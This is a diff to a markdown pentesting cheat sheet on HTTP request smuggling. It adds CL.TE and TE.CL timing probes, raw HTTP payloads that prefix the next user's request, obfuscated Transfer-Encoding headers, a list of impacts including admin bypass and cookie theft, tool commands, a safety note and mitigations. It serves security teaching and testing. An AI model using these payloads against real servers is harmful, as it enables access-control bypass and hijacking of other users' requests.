@@ -8,10 +8,34 @@ HTTP Request Smuggling happens when a front-end (proxy, load balancer, CDN) and 
 - `Transfer-Encoding: chunked` (TE) says the body ends at a zero-size chunk
 - If two servers prioritize different headers, the boundary desyncs
 
-## Variants and payloads
+## The three variants
+
+- **CL.TE** - front-end uses `Content-Length`, back-end uses `Transfer-Encoding`
+- **TE.CL** - front-end uses `Transfer-Encoding`, back-end uses `Content-Length`
+- **TE.TE** - both support TE, but one can be tricked into ignoring it (obfuscate the header)
+
+## Detection first (safe timing probes)
+
+Before exploiting, confirm a desync with a timing probe (a wrong `Content-Length` makes the back-end wait for bytes that never come):
 
 ```http
-# CL.TE - front-end uses Content-Length, back-end uses Transfer-Encoding
+# CL.TE timing probe - back-end hangs waiting for the chunk body
+POST / HTTP/1.1
+Host: target.tld
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+
+If the response is delayed by seconds, you likely have a CL.TE desync. Reverse the logic for TE.CL.
+
+## Exploitation payloads
+
+```http
+# CL.TE - smuggle a prefix onto the NEXT user's request
 POST / HTTP/1.1
 Host: target.tld
 Content-Length: 6
@@ -23,7 +47,7 @@ G
 ```
 
 ```http
-# TE.CL - front-end uses Transfer-Encoding, back-end uses Content-Length
+# TE.CL
 POST / HTTP/1.1
 Host: target.tld
 Content-Length: 4
@@ -31,30 +55,52 @@ Transfer-Encoding: chunked
 
 5c
 GPOST / HTTP/1.1
-...
+Host: target.tld
+
 0
 
 ```
 
+```http
+# TE.TE - obfuscate TE so only one server honours it
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding:[tab]chunked
+Transfer-Encoding : chunked
+```
+
+## What you can do with it (impact)
+
+- **Bypass front-end access controls** - smuggle a request to `/admin` that the front-end never inspected
+- **Steal other users' requests** - capture the victim's request (including cookies) by appending it to a stored/reflected field
+- **Web cache poisoning / deception**
+- **Turn a reflected XSS into one that needs no user interaction**
+
 ## Tools
 
-- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) - Burp extension by James Kettle
-- [Burp Suite Repeater](https://portswigger.net/burp) - disable "Update Content-Length" to test manually
+- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) - Burp extension by James Kettle (run this first)
+- Burp Repeater - **disable "Update Content-Length"** to craft payloads manually
 - [smuggler](https://github.com/defparam/smuggler) - CLI desync detection
 
-## Manual testing
+```bash
+# CLI detection
+python3 smuggler.py -u https://target.tld/
+```
 
-1. Use the Smuggler Burp extension to run the detection probes first
-2. Confirm a timing differential (a smuggled prefix delays the next response)
-3. Build a CL.TE or TE.CL payload based on which desync fired
-4. Escalate carefully - smuggling can affect real users, so keep it in scope and low-noise
+## Important safety note
 
-## Mitigation
+Smuggling affects **real users' traffic**. Only test in scope, keep concurrency low, and prefer the vendor's/lab environment. A careless payload can break the site for others.
 
-- Use HTTP/2 end to end and reject downgrades that reintroduce the ambiguity
-- Make front-end and back-end normalize headers identically
-- Reject requests that contain both `Content-Length` and `Transfer-Encoding`
-- Keep proxies/CDNs patched; this class evolves quickly
+## Mitigation - the fix
+
+- Use **HTTP/2 end to end** and do not downgrade to HTTP/1.1 at the back-end.
+- Make front-end and back-end normalise headers identically.
+- **Reject** any request containing both `Content-Length` and `Transfer-Encoding`.
+- Keep proxies/CDNs patched; this class evolves quickly.
+
+## Practice
+
+- [PortSwigger request smuggling labs](https://portswigger.net/web-security/request-smuggling)
 
 ## Deep dive
 
